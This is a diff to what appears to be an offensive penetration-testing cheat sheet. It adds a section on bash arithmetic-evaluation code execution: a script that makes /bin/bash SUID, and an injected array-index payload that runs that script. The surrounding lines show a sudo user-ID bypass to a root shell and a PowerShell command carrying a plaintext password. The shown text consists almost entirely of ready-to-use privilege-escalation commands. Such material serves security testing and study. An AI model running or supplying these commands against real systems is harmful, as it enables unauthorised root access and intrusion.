@@ -2533,6 +2533,21 @@ powershell -c "$SecPass = Convertto-securestring 'Welcome1!' -AsPlainText -Force
 sudo -u#-1 /bin/bash
 ```
 
+##### White Collar eval Arbitrary Code Execution
+
+> https://www.vidarholen.net/contents/blog/?p=716
+
+###### Example
+
+```c
+#!/bin/bash
+chmod +s /bin/bash
+```
+
+```c
+'a[$(/tmp/<FILE>.sh>&2)]+42' /tmp/<FILE>.sh
+```
+
 #### Basic Linux Enumeration
 
 ```c
